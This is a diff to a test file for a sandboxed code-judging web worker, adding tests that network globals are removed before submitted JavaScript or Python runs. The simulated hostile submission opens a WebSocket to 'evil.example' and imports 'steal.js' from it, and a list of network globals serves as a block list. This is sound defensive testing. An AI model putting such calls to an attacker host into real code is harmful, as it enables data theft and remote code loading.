@@ -44,8 +44,15 @@ function nodePyodide(): Promise<PyodideLike | null> {
   return sharedPyodide;
 }
 
+/** Network-capable globals of a real worker scope (plus importScripts, which the vm worker always has). */
+const NETWORK_GLOBALS = ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "Worker", "BroadcastChannel", "caches"];
+
 interface VmWorkerOptions {
   importedScripts?: string[];
+  /** Installs recording stand-ins for NETWORK_GLOBALS; every call that gets through lands here. */
+  networkCalls?: string[];
+  /** Receives each worker's global scope so tests can inspect it. */
+  scopes?: Record<string, unknown>[];
 }
 
 /** A WorkerLike whose global scope is a fresh vm context running judge-worker.js. */
@@ -81,6 +88,18 @@ function createVmWorker(options: VmWorkerOptions = {}): WorkerLike {
       return pyodide;
     };
   };
+  const calls = options.networkCalls;
+  if (calls) {
+    for (const name of NETWORK_GLOBALS) {
+      context[name] =
+        name === "caches"
+          ? { open: (cacheName: unknown) => calls.push(`caches.open(${String(cacheName)})`) }
+          : function (target: unknown) {
+              calls.push(`${name}(${String(target)})`);
+            };
+    }
+  }
+  options.scopes?.push(context);
   vm.createContext(context);
   vm.runInContext(WORKER_SOURCE, context, { filename: "judge-worker.js" });
   return worker;
@@ -156,17 +175,49 @@ describe("judge-worker.js (JavaScript)", () => {
     const outcome = await judgeCode(client(), { stage, mode: "run", language: "javascript", code: "const twice = (n) => n * 2;" });
     expect(outcome.ok && outcome.report.status).toBe("accepted");
   });
+
+  it("strips the network globals before user code runs (defense in depth behind the worker CSP)", async () => {
+    const calls: string[] = [];
+    const scopes: Record<string, unknown>[] = [];
+    const locked = new JudgeClient({ createWorker: () => createVmWorker({ networkCalls: calls, importedScripts: calls, scopes }) });
+    const names = JSON.stringify([...NETWORK_GLOBALS, "importScripts"]);
+    const code = `function twice(n) {
+  const attempts = [
+    () => fetch("/api/link"),
+    () => new XMLHttpRequest(),
+    () => new WebSocket("wss://evil.example"),
+    () => new EventSource("/api/stats"),
+    () => importScripts("https://evil.example/steal.js"),
+    () => new Worker("data:text/javascript,0"),
+    () => caches.open("loot"),
+  ];
+  for (const attempt of attempts) {
+    try { attempt(); } catch {}
+  }
+  const reachable = ${names}.filter((name) => typeof globalThis[name] !== "undefined" || typeof self[name] !== "undefined");
+  if (reachable.length > 0) throw new Error("reachable: " + reachable.join(", "));
+  return n * 2;
+}`;
+    const outcome = await judgeCode(locked, { stage, mode: "run", language: "javascript", code });
+    expect(outcome.ok && outcome.report.cases.map((c) => c.error ?? null)).toEqual([null, null]);
+    expect(outcome.ok && outcome.report.status).toBe("accepted");
+    expect(calls).toEqual([]);
+    expect(scopes.length).toBeGreaterThan(0);
+    for (const scope of scopes) expect([...NETWORK_GLOBALS, "importScripts"].filter((name) => name in scope)).toEqual([]);
+  });
 });
 
 describe("judge-worker.js (Python via Pyodide)", () => {
   let available = false;
   const imported: string[] = [];
+  const networkCalls: string[] = [];
+  const scopes: Record<string, unknown>[] = [];
   let client: JudgeClient;
 
   beforeAll(async () => {
     available = (await nodePyodide()) !== null;
     // One warm worker for the whole suite, exactly like the browser.
-    client = new JudgeClient({ createWorker: () => createVmWorker({ importedScripts: imported }) });
+    client = new JudgeClient({ createWorker: () => createVmWorker({ importedScripts: imported, networkCalls, scopes }) });
   }, 120_000);
 
   it("loads pyodide.js from the pinned CDN folder with core's harness", async () => {
@@ -183,6 +234,21 @@ describe("judge-worker.js (Python via Pyodide)", () => {
     if (!outcome.ok) return;
     expect(outcome.report.cases[0]!.logs).toEqual(["n is 2"]);
     expect(client.pythonStatus).toBe("ready");
+  }, 60_000);
+
+  it("strips the network globals once Pyodide is ready, and keeps judging", async () => {
+    if (!available) return;
+    const outcome = await judgeCode(client, {
+      stage: { functionName: "twice", compare: "exact", tests: [{ args: [3], expected: 6 }] },
+      mode: "run",
+      language: "python",
+      code: "def twice(n):\n    return n * 2\n",
+    });
+    expect(outcome.ok && outcome.report.status).toBe("accepted");
+    expect(scopes).toHaveLength(1);
+    expect([...NETWORK_GLOBALS, "importScripts"].filter((name) => name in scopes[0]!)).toEqual([]);
+    expect(scopes[0]!.loadPyodide).toBeTypeOf("function");
+    expect(networkCalls).toEqual([]);
   }, 60_000);
 
   it("accepts every Python reference solution", async () => {
